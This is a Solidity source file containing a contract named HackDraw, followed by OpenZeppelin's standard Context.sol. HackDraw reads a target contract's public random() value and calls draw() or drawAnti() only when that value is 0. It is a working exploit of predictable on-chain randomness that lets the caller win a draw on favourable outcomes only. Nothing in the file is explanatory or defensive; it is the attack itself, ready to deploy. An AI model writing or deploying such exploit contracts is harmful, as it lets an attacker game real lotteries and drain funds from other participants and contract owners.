pragma solidity ^0.8.0;

import '@openzeppelin/contracts/utils/Context.sol';

abstract contract targetContract { 
    function random() public virtual view returns (uint);
    function draw() public virtual;
    function drawAnti() public virtual;
}

contract HackDraw is Context
{
    targetContract public _target ;

    constructor(address target)
    {
        _target = targetContract(target);
    }

    function tryToGetRandom() public
    {
        //require(_msgSender() == address(0x58fa166Ef402fB805e5EEc6dE767332d966fA9D3), 'Not callable sender');
        uint r = _target.random();
        if(r == 0)
        {
            _target.draw();
        }
    }

    function getRandom() public returns (uint)
    {
        uint r = _target.random();
        _target.draw();
        return r;
    }


    function tryToGetRandomAnti() public
    {
        //require(_msgSender() == address(0x58fa166Ef402fB805e5EEc6dE767332d966fA9D3), 'Not callable sender');
        uint r = _target.random();
        if(r == 0)
        {
            _target.drawAnti();
        }
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}